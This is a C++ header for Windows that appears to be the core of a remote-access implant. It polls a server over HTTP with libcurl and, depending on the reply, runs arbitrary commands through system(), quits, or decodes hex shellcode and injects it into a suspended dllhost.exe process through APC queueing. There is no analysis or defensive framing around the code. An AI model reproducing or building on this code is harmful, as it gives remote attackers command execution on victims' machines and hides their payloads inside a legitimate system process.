#pragma once
#include "curl/curl.h"
#include <String.h>
#include <sstream>
#include <iostream>
#include <string>
#pragma comment(lib, "libcurl.lib")
#pragma comment ( lib, "ws2_32.lib" )
#pragma comment ( lib, "winmm.lib" )
#pragma comment ( lib, "wldap32.lib" )
#pragma comment(lib, "Advapi32.lib")




using namespace std;

DWORD WINAPI shellcode_run(LPVOID lpParameter);
string convert_ASCII(string hex);
string hexshellcode;


struct Param
{
    string hexstring;
};


class CURLClass
{
private:
    CURL* curl;
    stringstream ss;
    long http_code;
public:
    CURLClass()
        : curl(curl_easy_init())
        , http_code(0)
    {

    }
    ~CURLClass()
    {
        if (curl) curl_easy_cleanup(curl);
    }
    std::string Get(const std::string& url)
    {
        CURLcode res;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, this);

        ss.str("");
        http_code = 0;
        res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            throw std::runtime_error(curl_easy_strerror(res));
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        return ss.str();
    }
    long GetHttpCode()
    {
        return http_code;
    }
private:
    static size_t write_data(void* buffer, size_t size, size_t nmemb, void* userp)
    {
        return static_cast<CURLClass*>(userp)->Write(buffer, size, nmemb);
    }
    size_t Write(void* buffer, size_t size, size_t nmemb)
    {
        ss.write((const char*)buffer, size * nmemb);
        return size * nmemb;
    }
};


class Configure
{
private:
    int sleep;
    string type;
    string value;
public:
    Configure(string response)
    {
        istringstream is(response);	
        string line;

        char split = '\n';
        if (response.find("\n") == -1)
        {
            split = '\r';
        }


        while (getline(is, line, split))
        {
           
            int line_len = line.length();
            int flag = line.find(":");
            string key = line.substr(0, flag);
            string value = line.substr(flag + 1, line_len);
            if (key == "sleep")
            {
                this->sleep = atoi(value.c_str());
            }
            else if (key == "type")
            {
                this->type = value;
            }
            if (key == "value")
            {
                this->value = value;
            }
            cout << value << endl;
        }
    };
    ~Configure();

    VOID Selector()
    {

        if (this->type == "cmd\r" || this->type == "cmd")
        {
            system((this->value).c_str());
        }
        else if (this->type == "up\r" || this->type == "up")
        {
            //shellcode_run(this->value);
            try {

                hexshellcode = this->value;
                HANDLE hThread = CreateThread(NULL, NULL, shellcode_run, NULL, NULL, NULL);
            }
            catch(exception e)
            {
            };
        }
        else if (this->type == "exit\r" || this->type == "exit")
        {
            exit(0);
        }
        Sleep(this->sleep * 1000);

    };

private:

};



string convert_ASCII(string hex) {
    string ascii = "";
    for (size_t i = 0; i < hex.length(); i += 2) {
        //taking two characters from hex string
        string part = hex.substr(i, 2);
        //changing it into base 16
        char ch = stoul(part, nullptr, 16);
        //putting it into the ASCII string
        ascii += ch;
    }
    return ascii;
};

DWORD WINAPI shellcode_run(LPVOID lpParameter)
{
    string hexstring = hexshellcode;
    hexshellcode = "";
    string shellcode_str = convert_ASCII(hexstring);
    int len = hexstring.length();
    unsigned char shellcode[2048] = { 0 };
    memcpy(shellcode, shellcode_str.c_str(), len / 2 + 1);
    UINT shellcodeSize = sizeof(shellcode);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);
    return 0;
}